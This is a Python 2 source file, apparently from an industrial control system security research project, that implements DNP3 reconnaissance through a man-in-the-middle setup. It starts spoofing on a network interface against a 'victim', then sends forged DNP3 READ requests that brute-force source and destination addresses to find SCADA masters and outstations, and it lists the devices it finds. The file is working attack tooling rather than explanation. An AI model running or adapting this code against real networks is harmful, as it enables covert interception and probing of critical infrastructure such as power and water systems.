__author__ = 'Nicholas Rodofile'
from DNP3_Master import *

class DNP3_Reconnaissance(Master):
    def __init__(self, node, port):
        Master.__init__(self, node, port)

    def scan(self, addresses):
        while not self.running:
            if self.error:
                return
        print "Running Scan...range", addresses
        dst = 0
        src = 0
        while dst <= addresses and not self.got_response and self.running:
            while src <= addresses and not self.got_response and self.running:
                read_request_msg = self.node.spoofer.masquerade([appFuncCode["READ"], 'read_request_class0123'])
                read_request_msg[DNP3].SOURCE = src
                read_request_msg[DNP3].DESTINATION = dst
                self.send(read_request_msg)
                src += 1
            src = 0
            dst += 1
            if self.error:
                print "Closing Scan.. Error"
                return

        if self.got_response:
            print "Found DNP3 Device Address"

    def reconnaissance(self):
        while not self.running:
            pass
        print "reconnaissance running..."
        # if not self.node.spoofer.destination.DNP3_address \
        #         and not self.node.spoofer.source.DNP3_address:
        #     dnp3_address = read_config_dnp3(self.node.spoofer.source.ip_address)
        #     if dnp3_address is not None:
        #         self.node.spoofer.source.DNP3_address = int(dnp3_address['dnp3_src'])
        #         self.node.spoofer.destination.DNP3_address = int(dnp3_address['dnp3_dst'])
        #     else:
        #         #self.broadcast()
        #         if not self.node.spoofer.destination.DNP3_address \
        #                 and not self.node.spoofer.source.DNP3_address\
        #                 and self.running:
        self.scan(10)
        if not self.node.spoofer.destination.DNP3_address \
                and not self.node.spoofer.source.DNP3_address\
                and self.running:
            self.scan(256)
            #self.running = False
            #return 0

    def automation(self):
        self.reconnaissance()
        self.stop()

if __name__ == '__main__':
    """
    This Script is used to perform network discovery on DNP3 slaves
    """

    DNP3_nodes_found = []

    while True:
        mitm = DNP3_MITM_conf(interface='eth0')
        mitm.init_spoofing()
        victim = mitm.victim
        master = DNP3_Reconnaissance(victim, dnp3_port)
        DNP = master.start()
        DNP3_nodes_found.append(DNP)
        print "--------------- DNP3 Nodes Found ----------------"
        print "#################################################"
        for n in DNP3_nodes_found:
            print n["IP"], ": Master:", n["master"], " Slave:", n["slave"]
        print "#################################################"
        input_val = raw_input("Recon Next DNP3 device?")
        if input_val == 'n' or input_val == 'N':
            quit()